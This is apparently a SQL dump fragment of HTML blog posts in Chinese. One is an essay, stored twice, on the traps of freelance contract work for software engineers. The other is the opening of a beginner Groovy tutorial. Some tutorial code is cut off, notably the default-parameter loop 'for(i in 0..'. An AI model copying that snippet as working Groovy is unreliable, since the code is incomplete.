/>\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">正如阿甘说的：人生就像一盒巧克力，你永远不知道下一个会是什么口味。所以你永远不知道下一个项目在那里，但当你开始有了团队，每个月都要付薪水时，这时来一个不大不小的项目，反正也不知道下一个项目何时进来，这个刚好可以付团队薪水又可以拿来练兵，这也蛮好的。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，接私活有个特性是你接了这个项目就会降低接下个项目的能力，因为人力及时间总是有限，如果你因为接了一个小项目造成大项目没人力接，你说大家气不气 ? 不幸这个小项目的业主特别麻烦 (基于上述原因，你知道这机率还不小)，那你磨练团队的可不是他们的技术，你磨练的可是大家的身心灵啊，慢慢的就会有一股将相无能，累死三军的声音传出来了 &hellip; 你为何不自己开发个小产品来练兵呢 ?&nbsp;</span><br />\r\n<br />\r\n<strong>因为你应对客户有一套</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">你的个性很好，以前在公司的时候都可以和厂商或客户相处很好，可以接的接，不可以接的也会挡，如果出来接私活和客户应对对不会有问题。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，客户百百款，你对客户有一套，客户对你可是有好几套，他可以议价、杀价、压时间、加功能、拖验收、会计不见、老板出国 &hellip;..，最后怪你为何拖这么久再扣你一笔钱，说了一句：你们不是专业的吗 ? 开发阶段你们是朋友，验收阶段你们就变甲乙双方。&nbsp;</span><br />\r\n<br />\r\n<strong>因为你从来不缺客户</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">你从来不需要自己去陌生开发，客户都是透过朋友介绍或是客户转介绍来的，这比一般公司好太多了，别人想要客户都还没有呢。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，你有没有想过，你有上面所述种种优点，重点是你还比别人便宜，别人不找你，我都想找你了。所以你赚到钱了吗 ?&nbsp;</span><br />\r\n<br />\r\n<strong>因为你都有签合约</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">为了避免以上不必要的问题，每个项目你一定都会签合约保护双方，凡事照合约走就没问题了。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，对方有法务你有吗 ? 对方有钱你有吗 ? 真正要打官司你打的起吗 ? 你真的有把握合作过程中你完全没错 ? 合约里有办法规范到所有的功能细节、操作流程 ? 合约订了一大本，你客户会和你签 ? 所以，你真的能照合约走吗 ?&nbsp;</span><br />\r\n<br />\r\n<strong>你最近一次开心写代码是什么时候</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">在我和你有一样能力的时候，我曾经说过一句话：我希望我死前的最后一个动作是按下 【Enter】，我写代码的动力不是赚钱 ( 当然赚钱很重要，但如果只是赚钱，我大可去作直销、卖保险、到大公司上班 &hellip; )，精准来说不只是赚钱，我的动力来源来自于我写出来的代码可以让非常多人使用，真正帮助到很多人，而且很多人都说好。( 相信我，如果你真的作到这一点，其实你也赚到钱了 )&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">但自从我接私活之后，我最多只能帮助到我有限的客户，说精准一点也许就只有真正使用系统的某些人，也只有这些人会说我好，其它人也只会认为那是你该作的，但只要最后验收时他离职了、他生气了、一切努力就没了。所以那时我只有二个时候点是开心的，一个是收到订金、另一个是收到尾款，中间一大段时间是痛苦的，当同时多个项目进行，其实所有时间都是痛苦的。我还记得我那时常说的一句话：收到你冷冷的支票，我的心就觉得暖暖的。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">当然一定有人接私活接的很好，只是别人的成功很难複制，但别人的失败可以避免，如果你能避掉我以上所说的陷阱也无法保证你能成功，因为这也只是冰山一角，我已经离开接私活的状态很久，很多事忘了也不想去想，只是希望你在决定接私活前，仔细想一下，你真的只有接私活这个选项吗 ? 如果可以，我会建议你应该要开发自己的产品及服务。&nbsp;</span><br />\r\n&nbsp;</p>\r\n',0,0,'软件工程师的创业陷阱：接私活',155,NULL,0),(3,0,'20150604171639',2,'<p><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">我本身是 Java 工程师出身，写代码至今已超过 15 年，创业也超过 10 年，曾经外包过很多项目给别人，也接过很多外包的项目，现在不接了，只经营电子报发送平台，在二年内累积超过 5000 家企业用户使用。身处在创业圈，只要有创业朋友主动问过我的，我都会和他说如果你能不接就不要接 ( 当然我也知道，如果不是为了活下去，谁愿意接 ? )，因为这其中有太多陷阱，我分享如下给大家作个参考：&nbsp;</span><br />\r\n<br />\r\n<strong>因为你写代码很快</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">通常会出来接私活的工程师大多是有些年资，也会有自己擅常的工具及 library，所以往往可以很快完成主管交代的工作，会认为客户的需求只要能在很短的时间内完成，这个项目就赚钱了。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】项目完成的快慢取决于客户的心情，只要他心情不好，就慢慢拖吧。你以为你的 Code 可以 reuse，最后你才发现真正被 reuse 的是你的肝。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">因为你写代码很快，所以只要客户比价、杀价、压你结案时间，你就会心里想一下：嗯，只要我努力赶一下，应该没问题。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，无形中你就牺牲了你的利润空间，只有赚到微利，你知道工程师估完成时间的准确率有多少吗 ? 准确率有多高，赚到微利的机率就有多高。&nbsp;</span><br />\r\n<br />\r\n<strong>因为你可以赚每年的维护费</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">接私活是这样，只要你接了，之后的维护客户也很难不找你维护，只要慢慢的累积，每年都会有可观的维护费可以赚。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，你知道大部份台湾公司有个不成文规定，同一套系统的维护费预算是每年递减的，客户会想：系统每年调整也该稳定了吧，都稳定了你也没作什么事为什么还要拿这么多钱 ? 接下来，你可能会想说如果客户想加新功能第一个一定先找你，试想一下，叫你照着三年前自己写的代码架构来新增功能，如果没有吐血，大概代表这三年你也没什么长进。不接总行吧 ? 偏偏你就这么有责任感，你不接客户也只能打掉重来请别人重新作一套，你忍心吗 ? 所以你觉得这维护费好赚吗？&nbsp;</span><br />\r\n<br />\r\n<strong>因为你很能为客户着想</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">你因为很为公司着想，常常在开发过程中发现缺了什么或是主管规划错了，你会主动的加班把这些缺的部份补上调好，公司对你赞誉有加，如果接私活的时候以这样的态度来对待自己的客户，那双方合作的感觉一定很好。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，你的客户当然好啊，因为你主动帮他加功能把系统调的更好，都不用再花钱啊。加钱 ? 合约当初就签好了，如何告诉客户要加钱 ? 况且这是你自己主动要加功能的。可以不加吗 ? 可以啊，但你可以忍受你的作品明明可以更好的而不让它更好吗 ? 如果是当初规划就错了，不调整能验收吗 ?&nbsp;</span><br />\r\n<br />\r\n<strong>因为你知道客户要什么</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">因为在公司时主管常常也语无伦次，但你总是能分析出主管要的是什么，你也都能完成它，所以接私活时就算对方不懂技术，你也能完成他需要的功能。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，你知道客户要的是什么吗 ? 不，你不知道，因为绝大部份客户自己要什么都不知道，而且你知道客户的上面还有老板吗 ? 你知道客户的老板要的是什么吗 ? 不，你不会知道，因为连他老板自己都不知道，这是最可怕的吗 ? 不，还有更可怕的，他们会告诉你他们知道想要的功能是什么，但你就是无法作出他们想要的。&nbsp;</span><br />\r\n<br />\r\n<strong>因为你很能规划</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">你是个逻辑观念很好的人，只要主管告诉你他的需求，你可以很快画出系统架构图、代码架构图甚至是资料库架构图，准确率非常高，所以接私活的时候只要客户告诉你需求，你很快脑中就会出现各种架构图雏形。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，你知道规格是谁开的吗 ? 对，是客户开的，因为他不开你就无法报价，如果他要你开，你也怕开完后报价他不接受就等于作白工了。那你觉得客户的逻辑会有你好吗 ? 所以通常你要作的是先了解客户的逻辑，然后找出矛盾的地方，然后提出更好的解决方桉，这一段来来回回就要花不少时间了，喔对，这一段通常是收不到钱的，客户会觉得你要接我的项目，你本来就要先来了解我的需求。&nbsp;</span><br />\r\n<br />\r\n<strong>因为你有团队</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">因为你在业界有一定的人脉了，自己会写代码，再找个业务高手、美编高手，这样最小单位就好，大家可以分工，这样接私活的问题就变少、进行更顺利。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，因为你有三个人，所以你只能接可以养活 &gt;= 3 个人的项目，这种项目通常会稍大一点，因为以上所述种种原因会造成结案很慢，如果不结案人卡在这个项目拿不到钱，新的项目接不了，怎么办 ? 对，加人，所以你的团队变成了 4 个人，接下来你只能接可以养活 &gt;= 4 个人的项目，这个时候如果来了个大项目呢 ? 对，你会陷入无限迴圈，直到你再也接不到更大的项目。&nbsp;</span><br />\r\n<br />\r\n<strong>因为你想用客户的项目来练兵</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">正如阿甘说的：人生就像一盒巧克力，你永远不知道下一个会是什么口味。所以你永远不知道下一个项目在那里，但当你开始有了团队，每个月都要付薪水时，这时来一个不大不小的项目，反正也不知道下一个项目何时进来，这个刚好可以付团队薪水又可以拿来练兵，这也蛮好的。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，接私活有个特性是你接了这个项目就会降低接下个项目的能力，因为人力及时间总是有限，如果你因为接了一个小项目造成大项目没人力接，你说大家气不气 ? 不幸这个小项目的业主特别麻烦 (基于上述原因，你知道这机率还不小)，那你磨练团队的可不是他们的技术，你磨练的可是大家的身心灵啊，慢慢的就会有一股将相无能，累死三军的声音传出来了 &hellip; 你为何不自己开发个小产品来练兵呢 ?&nbsp;</span><br />\r\n<br />\r\n<strong>因为你应对客户有一套</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">你的个性很好，以前在公司的时候都可以和厂商或客户相处很好，可以接的接，不可以接的也会挡，如果出来接私活和客户应对对不会有问题。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，客户百百款，你对客户有一套，客户对你可是有好几套，他可以议价、杀价、压时间、加功能、拖验收、会计不见、老板出国 &hellip;..，最后怪你为何拖这么久再扣你一笔钱，说了一句：你们不是专业的吗 ? 开发阶段你们是朋友，验收阶段你们就变甲乙双方。&nbsp;</span><br />\r\n<br />\r\n<strong>因为你从来不缺客户</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">你从来不需要自己去陌生开发，客户都是透过朋友介绍或是客户转介绍来的，这比一般公司好太多了，别人想要客户都还没有呢。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，你有没有想过，你有上面所述种种优点，重点是你还比别人便宜，别人不找你，我都想找你了。所以你赚到钱了吗 ?&nbsp;</span><br />\r\n<br />\r\n<strong>因为你都有签合约</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">为了避免以上不必要的问题，每个项目你一定都会签合约保护双方，凡事照合约走就没问题了。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">【BUT】，对方有法务你有吗 ? 对方有钱你有吗 ? 真正要打官司你打的起吗 ? 你真的有把握合作过程中你完全没错 ? 合约里有办法规范到所有的功能细节、操作流程 ? 合约订了一大本，你客户会和你签 ? 所以，你真的能照合约走吗 ?&nbsp;</span><br />\r\n<br />\r\n<strong>你最近一次开心写代码是什么时候</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">在我和你有一样能力的时候，我曾经说过一句话：我希望我死前的最后一个动作是按下 【Enter】，我写代码的动力不是赚钱 ( 当然赚钱很重要，但如果只是赚钱，我大可去作直销、卖保险、到大公司上班 &hellip; )，精准来说不只是赚钱，我的动力来源来自于我写出来的代码可以让非常多人使用，真正帮助到很多人，而且很多人都说好。( 相信我，如果你真的作到这一点，其实你也赚到钱了 )&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">但自从我接私活之后，我最多只能帮助到我有限的客户，说精准一点也许就只有真正使用系统的某些人，也只有这些人会说我好，其它人也只会认为那是你该作的，但只要最后验收时他离职了、他生气了、一切努力就没了。所以那时我只有二个时候点是开心的，一个是收到订金、另一个是收到尾款，中间一大段时间是痛苦的，当同时多个项目进行，其实所有时间都是痛苦的。我还记得我那时常说的一句话：收到你冷冷的支票，我的心就觉得暖暖的。&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">当然一定有人接私活接的很好，只是别人的成功很难複制，但别人的失败可以避免，如果你能避掉我以上所说的陷阱也无法保证你能成功，因为这也只是冰山一角，我已经离开接私活的状态很久，很多事忘了也不想去想，只是希望你在决定接私活前，仔细想一下，你真的只有接私活这个选项吗 ? 如果可以，我会建议你应该要开发自己的产品及服务。&nbsp;</span><br />\r\n&nbsp;</p>\r\n',0,0,'软件工程师的创业陷阱：接私活',217,NULL,0),(4,0,'20150605183030',2,'<p>Groovy入门教程</p>\r\n\r\n<p>kmyhy@126.com&nbsp;&nbsp;2009-5-13</p>\r\n\r\n<p style=\"margin-left:21pt\">一、groovy是什么</p>\r\n\r\n<p>简单地说，Groovy&nbsp;是下一代的java语言，跟java一样,它也运行在&nbsp;JVM&nbsp;中。</p>\r\n\r\n<p>作为跑在JVM中的另一种语言，groovy语法与&nbsp;Java&nbsp;语言的语法很相似。同时，Groovy&nbsp;抛弃了java烦琐的文法。同样的语句，使用groovy能在最大限度上减少你的击键次数&mdash;&mdash;这确实是&ldquo;懒惰程序员们&rdquo;的福音。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p style=\"margin-left:21pt\">二、开发环境</p>\r\n\r\n<p style=\"margin-left:18pt\">1、&nbsp;&nbsp;jdk 1.5以上</p>\r\n\r\n<p style=\"margin-left:18pt\">2、&nbsp;&nbsp;eclipse+groovy plugin（支持Groovy 1.5.7）</p>\r\n\r\n<p>打开eclipse，通过Software Updates &gt; Find and Install...菜单，使用&ldquo;Search for new features to install&rdquo;&nbsp;下载并安装groovy插件。New一个远程站点，url可使用http://dist.codehaus.org/groovy/distributions/update/，插件名：Groovy plug-in。根据需要你可以同时选择groovy和grails（后续会学习到）：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p style=\"margin-left:21pt\">三、创建groovy项目</p>\r\n\r\n<p style=\"margin-left:18pt\">1、&nbsp;&nbsp;新建一个groovy项目</p>\r\n\r\n<p>New --&gt; Project&nbsp;&agrave;&nbsp;Java Project&nbsp;创建一个java项目。为了方便管理，建议在source中建两个source文件夹java和groovy，分别用于存储java源文件和groovy源文件：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p style=\"margin-left:18pt\">2、&nbsp;&nbsp;添加&nbsp;Groovy&nbsp;特性</p>\r\n\r\n<p>在项目上右击，Groovy&nbsp;&agrave;&nbsp;Add Groovy Nature，这样会在项目中添加&nbsp;Groovy Libraries。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p style=\"margin-left:18pt\">3、&nbsp;&nbsp;添加&nbsp;Groovy&nbsp;类</p>\r\n\r\n<p>在项目groovy源文件下右键，New&nbsp;&agrave;&nbsp;Other&nbsp;&agrave;Groovy&nbsp;&agrave;&nbsp;Groovy Class</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>自动生成的源代码如下：</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">public class HelloWorld{\r\n\r\n    /**\r\n\r\n     * @param args\r\n\r\n     */\r\n\r\n    public static void main(def args){\r\n\r\n       // TODO Auto-generated method stub\r\n\r\n    }  \r\n\r\n}</code></pre>\r\n\r\n<p>我们在main方法中加一句打印语句：</p>\r\n\r\n<p>println &quot;Hello World&quot;</p>\r\n\r\n<p style=\"margin-left:18pt\">4、&nbsp;&nbsp;编译运行groovy类</p>\r\n\r\n<p>在源文件上右键，Compile Groovy File，然后右键，Run As&nbsp;&agrave;&nbsp;Groovy&nbsp;，在控制台中查看运行结果。</p>\r\n\r\n<p>实际上&nbsp;groovy&nbsp;语法的简练还体现在，就算整个文件中只有println &quot;Hello World&quot;这一句代码（把除这一句以外的语句删除掉吧），程序也照样能够运行。</p>\r\n\r\n<p>当然，为了说明groovy&nbsp;其实就是java，你也可以完全按照java&nbsp;语法来编写HelloWorld类。<br />\r\n&nbsp;</p>\r\n\r\n<p style=\"margin-left:21pt\">四、Groovy语法简介</p>\r\n\r\n<p style=\"margin-left:18pt\">1、&nbsp;&nbsp;没有类型的java</p>\r\n\r\n<p>作为动态语言，groovy中所有的变量都是对象(类似于.net framework，所有对象继承自java.lang.Object)，在声明一个变量时，groovy不要求强制类型声明，仅仅要求变量名前使用关键字def（从groovy jsr 1开始，在以前的版本中，甚至连def都不需要）。</p>\r\n\r\n<p>修改main&nbsp;方法中的代码：</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">def var=\"hello world\"\r\n\r\nprintln var\r\n\r\nprintln var.class</code></pre>\r\n\r\n<p>你可以看到程序最后输出了var的实际类型为：java.lang.String</p>\r\n\r\n<p>作为例外，方法参数和循环变量的声明不需要def。</p>\r\n\r\n<p style=\"margin-left:18pt\">2、&nbsp;&nbsp;不需要的public</p>\r\n\r\n<p>你可以把main方法前面的public去掉，实际上，groovy中默认的修饰符就是public，所以public修饰符你根本就不需要写，这点跟java不一样。</p>\r\n\r\n<p style=\"margin-left:18pt\">3、&nbsp;&nbsp;不需要的语句结束符</p>\r\n\r\n<p>Groovy中没有语句结束符，当然为了与java保持一致性，你也可以使用;号作为语句结束符。在前面的每一句代码后面加上;号结束，程序同样正常运行(为了接受java程序员的顽固习惯)。</p>\r\n\r\n<p style=\"margin-left:18pt\">4、&nbsp;&nbsp;字符串连接符</p>\r\n\r\n<p>跟java一样，如果你需要把一个字符串写在多行里，可以使用+号连接字符串。代码可以这样写：</p>\r\n\r\n<p>&nbsp; &nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">   def var=\"hello \"+\r\n\r\n       \"world\"+\r\n\r\n       \",groovy!\"</code></pre>\r\n\r\n<p>当然更groovy的写法是：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>def</strong>&nbsp;var=&quot;&quot;&quot;hello</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;world</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;groovy!&quot;&quot;&quot;</p>\r\n\r\n<p>三个&rdquo;号之间不在需要+号进行连接（不过字符串中的格式符都会被保留，包括回车和tab）。</p>\r\n\r\n<p style=\"margin-left:18pt\">5、&nbsp;&nbsp;一切皆对象</p>\r\n\r\n<p>听起来象是&ldquo;众生平等&rdquo;的味道，事实上groovy对于对象是什么类型并不关心，一个变量的类型在运行中随时可以改变，一切根据需要而定。如果你赋给它boolean&nbsp;，那么不管它原来是什么类型，它接受boolean值之后就会自动把类型转变为boolean值。看下面的代码：</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">def var=\"hello \"+\r\n\r\n       \"world\"+\r\n\r\n       \",groovy!\"\r\n\r\n       println var;\r\n\r\n       println var.class;\r\n\r\n       var=1001\r\n\r\n       println var.class</code></pre>\r\n\r\n<p>输出结果：</p>\r\n\r\n<p>hello world,groovy!</p>\r\n\r\n<p>class java.lang.String</p>\r\n\r\n<p>class java.lang.Integer</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>var这个变量在程序运行中，类型在改变。一开始给它赋值String，它的类型就是String，后面给它赋值Integer，它又转变为Integer。</p>\r\n\r\n<p style=\"margin-left:18pt\">6、&nbsp;&nbsp;循环</p>\r\n\r\n<p>删除整个源文件内容，用以下代码替代：</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp;&nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\"> def var=\"hello \"+\r\n\r\n       \"world\"+\r\n\r\n       \",groovy!\"\r\n\r\n       def repeat(val){\r\n\r\n            for(i = 0; i &lt; 5; i++){\r\n\r\n             println val\r\n\r\n            }\r\n\r\n       }\r\n\r\n       repeat(var)</code></pre>\r\n\r\n<p>输出：</p>\r\n\r\n<p>hello world,groovy!</p>\r\n\r\n<p>hello world,groovy!</p>\r\n\r\n<p>hello world,groovy!</p>\r\n\r\n<p>hello world,groovy!</p>\r\n\r\n<p>hello world,groovy!</p>\r\n\r\n<p>注意循环变量i前面没有def。当然也没有java中常见的int，但如果你非要加上int也不会有错，因为从Groovy1.1beta2之后开始（不包括1.1beta2），groovy开始支持java经典的for循环写法。</p>\r\n\r\n<p>此外，上面的for语句还可以写成：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>for</strong>(i&nbsp;<strong>in</strong>&nbsp;0..5)</p>\r\n\r\n<p>这样的结果是一样的。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p style=\"margin-left:18pt\">7、&nbsp;&nbsp;String&nbsp;和&nbsp;Gstring</p>\r\n\r\n<p>除了标准的java.lang.String以外（用&rsquo;号括住），groovy还支持Gstring字符串类型（用&ldquo;号括住）。把上面的for循环中的语句改成：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;&quot;This is ${i}:${val}&quot;</p>\r\n\r\n<p>运行一下，你就会明白什么是Gstring。</p>\r\n\r\n<p style=\"margin-left:18pt\">8、&nbsp;&nbsp;范围</p>\r\n\r\n<p>这个跟pascal中的&ldquo;子界&rdquo;是一样的。在前面的for循环介绍中我们已经使用过的<strong>for</strong>(i&nbsp;<strong>in</strong>&nbsp;0..5)这样的用法，其中的0..5就是一个范围。</p>\r\n\r\n<p>范围&nbsp;是一系列的值。例如&nbsp;&ldquo;0..4&rdquo;&nbsp;表明包含&nbsp;整数&nbsp;0、1、2、3、4。Groovy&nbsp;还支持排除范围，&ldquo;0..&lt;4&rdquo;&nbsp;表示&nbsp;0、1、2、3。还可以创建字符范围：&ldquo;a..e&rdquo;&nbsp;相当于&nbsp;a、b、c、d、e。&ldquo;a..</p>\r\n\r\n<p>范围主要在for循环中使用。</p>\r\n\r\n<p style=\"margin-left:18pt\">9、&nbsp;&nbsp;默认参数值</p>\r\n\r\n<p>可以为方法指定默认参数值。我们修改repeat方法的定义：</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">def repeat(val,repeat=3){\r\n\r\n            for(i in 0..\r\n\r\n             println \"This is ${i}:${val}\"\r\n\r\n            }\r\n\r\n       }</code></pre>\r\n\r\n<p>可以看到，repeat方法增加了一个参数repeat（并且给了一个默认值3），用于指定循环次数。</p>\r\n\r\n<p>当我们不指定第2个参数调用repeat方法时，repeat参数取默认值3。</p>\r\n\r\n<p style=\"margin-left:18pt\">10、&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;集合</p>\r\n\r\n<p>Groovy支持最常见的两个java集合：java.util.Collection和java.util.Map。前面所说的范围实际也是集合的一种（java.util.List）。</p>\r\n\r\n<p>(1) 